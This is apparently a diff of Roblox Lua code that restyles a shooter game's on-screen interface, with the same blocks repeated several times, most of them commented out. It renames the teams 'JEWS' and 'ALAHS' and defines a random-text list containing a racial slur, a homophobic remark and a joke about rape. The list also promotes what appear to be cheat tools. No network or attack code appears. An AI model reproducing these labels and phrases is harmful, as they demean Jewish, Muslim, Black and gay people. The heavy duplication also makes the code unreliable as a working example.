+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
